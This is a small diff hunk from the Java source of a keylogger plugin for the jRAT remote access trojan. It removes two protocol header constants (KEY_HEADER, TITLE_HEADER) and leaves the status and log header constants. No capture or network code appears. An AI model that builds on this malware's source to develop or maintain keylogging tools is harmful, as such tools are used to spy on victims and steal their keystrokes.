@@ -29,8 +29,6 @@ public class KeyloggerPlugin extends jrat.api.stub.StubPlugin {
 	public static DataOutputStream dos;
 	public static boolean enabled;
 
-	public static final byte KEY_HEADER = 121;
-	public static final byte TITLE_HEADER = 122;
 	public static final byte STATUS_HEADER = 123;
 	public static final byte LOGS_HEADER = 124;
 	public static final byte LOG_HEADER = 125;
